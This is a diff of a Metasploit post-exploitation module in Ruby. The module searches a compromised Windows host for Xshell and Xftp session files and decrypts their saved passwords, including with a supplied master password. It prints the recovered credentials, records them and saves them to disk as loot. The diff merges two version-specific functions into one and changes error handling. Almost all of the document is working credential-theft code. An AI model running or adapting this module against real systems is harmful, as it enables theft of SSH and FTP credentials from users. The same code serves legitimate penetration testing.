@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex/parser/ini'
 require 'rex/parser/netsarang'
 require 'msf/core/auxiliary/report'
 
@@ -56,11 +55,13 @@ class MetasploitModule < Msf::Post
   end
 
   def enable_master_passwd?(version_6_path)
-    file_path = expand_path(version_6_path + '\\Common\\MasterPassword.mpw')
-    file = read_file(file_path) if session.fs.file.exist?(file_path)
-    raise 'No data to parse' if file.nil? || file.empty?
+    file_name = expand_path(version_6_path + '\\Common\\MasterPassword.mpw')
+    file_contents = read_file(file_name) if session.fs.file.exist?(file_name)
+    if file_contents.nil? || file_contents.empty?
+      return false
+    end
 
-    file = try_encode_file(file)
+    file = try_encode_file(file_contents)
     file.include?('EnblMasterPasswd=1')
   end
 
@@ -92,131 +93,57 @@ class MetasploitModule < Msf::Post
     create_credential_login(login_data)
   end
 
-  def enum_version_5_session_file(path, user_profiles)
+  def enum_session_file(path, user_profiles)
+    xsh_xfp = []
+    tbl = []
     print_status("Search session files on #{path}")
-    xsh = session.fs.file.search(path, '*.xsh')
-    xfp = session.fs.file.search(path, '*.xfp')
-    columns = [
-      'Type',
-      'Name',
-      'Host',
-      'Port',
-      'UserName',
-      'Plaintext',
-      'Password'
-    ]
-    tbl = Rex::Text::Table.new(
-      'Header' => "Path: #{path}",
-      'Columns' => columns
-    )
-    xsh.each do |item|
-      file = read_file(item['path'] + session.fs.file.separator + item['name'])
-      raise 'No data to parse' if file.nil? || file.empty?
+    xsh_xfp += session.fs.file.search(path, '*.xsh')
+    xsh_xfp += session.fs.file.search(path, '*.xfp')
 
-      file = try_encode_file(file)
-      ini = Rex::Parser::Ini.from_s(file)
-      version, host, port, username, password = parser_xsh(ini)
-      xshell = NetSarangCrypto.new('xshell', version, user_profiles['UserName'], user_profiles['SID'])
-      xshell_plaintext, _is_valid = xshell.decrypt_string(password) if password
-      config = {
-        type: 'ssh',
+    # enum session file
+    xsh_xfp.each do |item|
+      file_name = item['path'] + session.fs.file.separator + item['name']
+      file_contents = read_file(file_name)
+      if file_contents.nil? || file_contents.empty?
+        print_status "Skipping empty file: #{file_name}"
+        next
+      end
+
+      file = try_encode_file(file_contents)
+      session_type = (File.extname(file_name) == '.xsh') ? 'Xshell' : 'Xftp'
+
+      # parser configure file
+      if session_type == 'Xshell'
+        version, host, port, username, password = parser_xsh(file)
+      else
+        version, host, port, username, password = parser_xfp(file)
+      end
+
+      # decrypt password
+      if enable_master_passwd?(path)
+        net_sarang = NetSarangCrypto.new(session_type, version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD'])
+      else
+        net_sarang = NetSarangCrypto.new(session_type, version, user_profiles['UserName'], user_profiles['SID'])
+      end
+      plaintext = net_sarang.decrypt_string(password) if password
+      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !plaintext && password
+      tbl << {
+        version: "#{session_type}_V" + version.to_s,
+        file_name: item['name'],
         host: host,
         port: port,
         username: username,
-        password: xshell_plaintext
+        plaintext: plaintext,
+        password: password
       }
-      net_sarang_store_config(config)
-      tbl << ['Xshell_V' + version.to_s, item['name'], host, port, username, xshell_plaintext, password]
     end
-    xfp.each do |item|
-      file = read_file(item['path'] + session.fs.file.separator + item['name'])
-      raise 'No data to parse' if file.nil? || file.empty?
-
-      file = try_encode_file(file)
-      ini = Rex::Parser::Ini.from_s(file)
-      version, host, port, username, password = parser_xfp(ini)
-      xftp = NetSarangCrypto.new('xftp', version, user_profiles['UserName'], user_profiles['SID'])
-      xftp_plaintext, _is_valid = xftp.decrypt_string(password) if password
-      config = {
-        type: 'ftp',
-        host: host,
-        port: port,
-        username: username,
-        password: xftp_plaintext
-      }
-      net_sarang_store_config(config)
-      tbl << ['Xftp_V' + version.to_s, item['name'], host, port, username, xftp_plaintext, password]
-    end
-    print_line(tbl.to_s)
-  end
-
-  def enum_version_6_session_file(path, user_profiles)
-    print_status("Search session files on #{path}")
-    xsh = session.fs.file.search(path, '*.xsh')
-    xfp = session.fs.file.search(path, '*.xfp')
-    columns = [
-      'Type',
-      'Name',
-      'Host',
-      'Port',
-      'UserName',
-      'Plaintext',
-      'Password'
-    ]
-    tbl = Rex::Text::Table.new(
-      'Header' => "Path: #{path}",
-      'Columns' => columns
-    )
-    xsh.each do |item|
-      file = read_file(item['path'] + session.fs.file.separator + item['name'])
-      raise 'No data to parse' if file.nil? || file.empty?
-
-      file = try_encode_file(file)
-      ini = Rex::Parser::Ini.from_s(file)
-      version, host, port, username, password = parser_xsh(ini)
-      xshell = NetSarangCrypto.new('xshell', version, user_profiles['UserName'], user_profiles['SID'])
-      xshell = NetSarangCrypto.new('xshell', version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD']) if enable_master_passwd?(path)
-      is_valid = true
-      xshell_plaintext, is_valid = xshell.decrypt_string(password) if password
-      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !is_valid
-      config = {
-        type: 'ssh',
-        host: host,
-        port: port,
-        username: username,
-        password: xshell_plaintext
-      }
-      net_sarang_store_config(config)
-      tbl << ['Xshell_V' + version.to_s, item['name'], host, port, username, xshell_plaintext, password]
-    end
-    xfp.each do |item|
-      file = read_file(item['path'] + session.fs.file.separator + item['name'])
-      raise 'No data to parse' if file.nil? || file.empty?
-
-      file = try_encode_file(file)
-      ini = Rex::Parser::Ini.from_s(file)
-      version, host, port, username, password = parser_xfp(ini)
-      xftp = NetSarangCrypto.new('xftp', version, user_profiles['UserName'], user_profiles['SID'])
-      xftp = NetSarangCrypto.new('xftp', version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD']) if enable_master_passwd?(path)
-      is_valid = true
-      xftp_plaintext, is_valid = xftp.decrypt_string(password) if password
-      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !is_valid
-      config = {
-        type: 'ftp',
-        host: host,
-        port: port,
-        username: username,
-        password: xftp_plaintext
-      }
-      net_sarang_store_config(config)
-      tbl << ['Xftp_V' + version.to_s, item['name'], host, port, username, xftp_plaintext, password]
-    end
-    print_line(tbl.to_s)
+    return tbl
   end
 
   def run
     print_status("Gather Xshell and Xftp Passwords on #{sysinfo['Computer']}")
     profiles = grab_user_profiles
+    result = []
     profiles.each do |user_profiles|
       next if user_profiles['SID'].nil?
 
@@ -227,8 +154,38 @@ class MetasploitModule < Msf::Post
       net_sarang_path_5 = expand_path(registry_getvaldata(parent_key_5, 'UserDataPath'))
 
       # enum session file
-      enum_version_5_session_file(net_sarang_path_5, user_profiles) if session.fs.file.exist?(net_sarang_path_5)
-      enum_version_6_session_file(net_sarang_path_6, user_profiles) if session.fs.file.exist?(net_sarang_path_6)
+      result += enum_session_file(net_sarang_path_5, user_profiles) if session.fs.file.exist?(net_sarang_path_5)
+      result += enum_session_file(net_sarang_path_6, user_profiles) if session.fs.file.exist?(net_sarang_path_6)
+    end
+    columns = [
+      'Type',
+      'Name',
+      'Host',
+      'Port',
+      'UserName',
+      'Plaintext',
+      'Password'
+    ]
+    tbl = Rex::Text::Table.new(
+      'Header' => 'Xshell and Xftp Password',
+      'Columns' => columns
+    )
+    result.each do |item|
+      tbl << item.values
+      config = {
+        type: item[:version].starts_with?('Xshell') ? 'ssh' : 'ftp',
+        host: item[:host],
+        port: item[:port].to_i,
+        username: item[:username],
+        password: item[:plaintext]
+      }
+      net_sarang_store_config(config)
+    end
+    print_line(tbl.to_s)
+    # Only save data to disk when there's something in the table
+    if tbl.rows.count
+      path = store_loot('host.xshell_xftp_password', 'text/plain', session, tbl, 'xshell_xftp_password.txt', 'Xshell Xftp Passwords')
+      print_good("Passwords stored in: #{path}")
     end
   end
 end
